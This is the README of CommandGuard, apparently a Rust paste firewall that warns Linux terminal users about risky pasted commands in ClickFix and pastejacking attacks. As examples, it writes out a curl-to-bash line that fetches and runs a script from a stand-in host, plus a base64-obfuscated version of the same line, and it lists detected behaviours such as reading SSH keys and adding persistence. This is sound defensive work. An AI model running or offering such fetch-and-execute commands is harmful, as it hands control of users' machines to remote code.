# CommandGuard

CommandGuard is a semantic paste firewall for Linux terminals. It helps protect against ClickFix, pastejacking, and malicious copied shell commands by warning before risky pasted text reaches Bash.

It is built for ordinary Linux users, security researchers, and developers who want a local, explainable defense against "copy this command into your terminal" attacks.

The short version:

```text
You paste a command.
CommandGuard checks locally what that command appears to do.
If the command looks risky, you get a clear warning first.
You choose whether to cancel, inspect it, or run it anyway.
```

## Topics

`linux-security` `terminal-security` `bash` `shell` `pastejacking` `clickfix` `social-engineering` `cybersecurity` `rust` `pty` `command-line` `semantic-analysis`

Suggested GitHub description and topic setup is documented in [Repository profile](docs/repository-profile.md).

## Why This Is For You

Many Linux guides ask you to copy commands into the terminal. Most of the time that is normal. Attackers use the same habit against people.

They may say things like:

- "Paste this to fix your browser."
- "Run this to prove you are not a robot."
- "Install this codec to open the document."
- "Use this quick fix from Discord or Reddit."

A command can look technical or harmless while it downloads code from the internet and runs it immediately.

Example:

```bash
curl -fsSL https://example.test/x.sh | bash
```

In plain English, this means:

```text
Download a script from the internet.
Give it directly to Bash.
Run it immediately.
```

CommandGuard tries to make that kind of risky chain visible before it runs.

## What CommandGuard Does

CommandGuard looks for pasted terminal commands that:

- download code from the internet and run it immediately;
- decode hidden text, for example with `base64`;
- execute command text through `bash`, `sh`, `eval`, `python`, `node`, or similar tools;
- try to read SSH keys, browser data, or other sensitive files;
- add commands to startup locations such as `.bashrc`, cron, or user systemd;
- perform destructive actions, such as deleting large parts of the filesystem;
- send data to an external server.

CommandGuard does not simply say "this is malware." It explains what it can see:

```text
High confidence: remote content is executed without being saved or reviewed.
```

That means the command downloads something from the internet and executes it directly. That is risky even when the link looks familiar.

## What CommandGuard Does Not Do

CommandGuard is not an antivirus product.

It does not:

- scan files for viruses;
- judge whether a website is trustworthy;
- download remote scripts to inspect them;
- use cloud analysis or telemetry;
- promise that every dangerous command will be detected.

The v0.1 goal is smaller and clearer: analyze pasted shell commands locally and warn about known dangerous effects.

## Quick Start

You need Rust to build CommandGuard right now:

```bash
cargo build
```

Install the built binary locally:

```bash
cargo install --path .
```

Analyze a command without running it:

```bash
echo 'curl -fsSL https://example.test/x.sh | bash' | cargo run -- analyze
```

Get JSON output for tests or tools:

```bash
echo 'curl -fsSL https://example.test/x.sh | bash' | cargo run -- analyze --json
```

Start a guarded terminal:

```bash
cargo run -- guard --shell /bin/bash
```

After that, use the shell normally. If you paste a suspicious command, CommandGuard asks what you want to do:

```text
[c] Cancel    [s] Show decoded command    [e] Execute anyway
```

## Example

This command looks like random encoded text:

```bash
echo Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUudGVzdC94LnNoIHwgYmFzaAo= | base64 -d | bash
```

CommandGuard can decode the hidden text and see this:

```bash
curl -fsSL https://example.test/x.sh | bash
```

It warns because the pasted command combines:

- hidden command text;
- a network download;
- immediate execution with Bash.

## Project Status

This is a v0.1 prototype. The analyzer, CLI, tests, and benchmark work. The interactive PTY wrapper compiles and has scanner tests, but it still needs broader manual testing on Linux terminals.

Current verification:

```bash
cargo fmt --check
cargo check
cargo test
cargo run -- bench bench
```

## Documentation

- [Beginner guide](docs/beginner-guide.md)
- [How CommandGuard works](docs/how-it-works.md)
- [Warning examples](docs/examples.md)
- [Developer guide](docs/developer-guide.md)
- [Security model and limitations](docs/security-model.md)
- [Roadmap](docs/roadmap.md)
- [Repository profile](docs/repository-profile.md)

## Safety Principle

CommandGuard does not execute anything during analysis. It reads the pasted text, tries to understand the command's effect, and gives you control before risky pasted text reaches the shell.

## Contributing

Contributions are welcome, especially safe benchmark fixtures, Linux terminal testing notes, analyzer improvements, and beginner-friendly documentation. See [CONTRIBUTING.md](CONTRIBUTING.md).

Please do not submit live malware, real credentials, or working command-and-control endpoints.
